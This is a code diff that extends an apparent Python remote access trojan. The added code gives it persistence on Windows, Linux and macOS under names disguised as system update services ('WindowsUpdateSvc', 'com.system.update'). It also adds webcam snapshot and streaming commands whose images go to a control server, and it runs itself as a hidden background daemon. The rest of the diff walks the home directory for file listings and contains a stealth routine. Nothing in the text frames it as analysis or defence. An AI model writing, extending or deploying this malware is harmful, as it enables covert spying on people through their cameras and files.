@@ -34,7 +34,7 @@ except:
 
 streaming = False
 
-# ====================== STEALTH ======================
+# ====================== STEALTH & BACKGROUND ======================
 def hide_everything():
     if platform.system() == "Windows":
         try:
@@ -48,15 +48,49 @@ def hide_everything():
         pass
 
 def add_persistence():
-    if platform.system() == "Linux":
+    exe = os.path.abspath(__file__)
+    sys_name = platform.system()
+
+    if sys_name == "Windows":
         try:
-            exe_path = os.path.abspath(__file__)
-            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot nohup python3 {exe_path} >/dev/null 2>&1 &") | crontab -'
+            import winreg
+            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(reg, "WindowsUpdateSvc", 0, winreg.REG_SZ, f"pythonw.exe \"{exe}\"")
+            winreg.CloseKey(reg)
+        except:
+            pass
+
+    elif sys_name == "Linux":
+        try:
+            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot nohup python3 \"{exe}\" >/dev/null 2>&1 &") | crontab -'
             subprocess.run(cron_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
             pass
 
-# ====================== CRYPTO & NETWORK ======================
+    elif sys_name == "Darwin":  # macOS
+        try:
+            plist = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
+            content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key><string>com.system.update</string>
+    <key>ProgramArguments</key><array><string>python3</string><string>{exe}</string></array>
+    <key>RunAtLoad</key><true/>
+    <key>KeepAlive</key><true/>
+    <key>StandardOutPath</key><string>/dev/null</string>
+    <key>StandardErrorPath</key><string>/dev/null</string>
+</dict>
+</plist>'''
+            os.makedirs(os.path.dirname(plist), exist_ok=True)
+            with open(plist, "w") as f:
+                f.write(content)
+            subprocess.run(["launchctl", "load", "-w", plist], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+# ====================== CRYPTO ======================
 def aes_encrypt(data: dict) -> str:
     iv = os.urandom(12)
     aesgcm = AESGCM(AES_KEY)
@@ -115,15 +149,14 @@ def get_system_info():
     except:
         return {"hostname": HOSTNAME, "ip": "127.0.0.1", "mac": "00:00:00:00:00:00"}
 
-# ====================== FILE LIST - FIXED FOR LINUX ======================
-def get_file_list(start_path=None):
+# ====================== FILE LIST (Fixed for Linux) ======================
+def get_file_list():
     files = []
-    if start_path is None:
-        start_path = os.path.expanduser("~")   # Start from home on Linux
+    start_path = os.path.expanduser("~")   # Start from home on all OS (safe)
 
     try:
         for root, dirs, filenames in os.walk(start_path, topdown=True, onerror=None):
-            if root.count(os.sep) - start_path.count(os.sep) > 4:  # limit depth
+            if root.count(os.sep) - start_path.count(os.sep) > 4:
                 del dirs[:]
                 continue
             if len(files) > 700:
@@ -161,7 +194,7 @@ def get_file_list(start_path=None):
         pass
     return files
 
-# ====================== COMMAND HANDLER ======================
+# ====================== COMMANDS ======================
 def handle_command(cmd: str):
     global streaming
     if not cmd:
@@ -197,19 +230,33 @@ def handle_command(cmd: str):
                 cap.release()
                 if ret:
                     _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
-                    img_b64 = base64.b64encode(buffer).decode()
-                    enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img_b64})
+                    enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": base64.b64encode(buffer).decode()})
             except:
                 pass
 
     elif cmd == "stream_on":
-        global streaming
         if not streaming:
             streaming = True
-            threading.Thread(target=lambda: [enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": take_snapshot()}) or time.sleep(4) for _ in iter(int,1) if streaming], daemon=True).start()
+            threading.Thread(target=lambda: [enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": take_snapshot() or ""}) or time.sleep(4) for _ in iter(int,1) if streaming], daemon=True).start()
+
+    elif cmd == "stream_off":
+        streaming = False
 
     elif cmd == "uninstall":
         os._exit(0)
+
+def take_snapshot():
+    if not HAS_CV2: return None
+    try:
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cap.release()
+        if ret:
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
+            return base64.b64encode(buffer).decode()
+    except:
+        pass
+    return None
 
 # ====================== MAIN ======================
 def main():
@@ -229,11 +276,11 @@ def main():
             time.sleep(20)
 
 if __name__ == "__main__":
-    # This allows running in background without blocking terminal
-    if os.fork():
-        sys.exit(0)   # Parent exits, child continues in background
-    os.setsid()       # Create new session
-    if os.fork():
-        sys.exit(0)   # Second fork for full daemon
-
+    # Allow double-click without blocking terminal on Linux/macOS
+    if platform.system() != "Windows":
+        if os.fork():
+            sys.exit(0)
+        os.setsid()
+        if os.fork():
+            sys.exit(0)
     main()
